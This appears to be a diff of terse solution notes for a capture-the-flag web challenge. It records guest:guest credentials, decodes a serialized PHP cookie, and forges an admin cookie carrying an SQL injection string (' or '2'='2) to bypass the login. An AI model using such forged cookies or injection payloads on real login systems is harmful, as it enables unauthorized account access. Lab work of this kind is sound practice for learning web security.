@@ -1,0 +1,23 @@
+
+/index.php?file=login
+/login.php
+/admin.php
+    onclick="document.cookie='user_info=;
+/cookie.php
+
+
+This problem has a combination of vulnerabilities.
+Think of other things that might be vulnerable with a login. Perhaps not something technically vulnerable.
+Does the weak username have a weak password?
+Not every login page has something vulnerable. There are legitimate accounts on this site.
+
+"I could login as regular_user."
+
+guest:guest
+
+Cookie:
+user_info=TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D
+O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
+
+O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:12:"g' or '2'='2";}
+TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTI6ImcnIG9yICcyJz0nMiI7fQ==
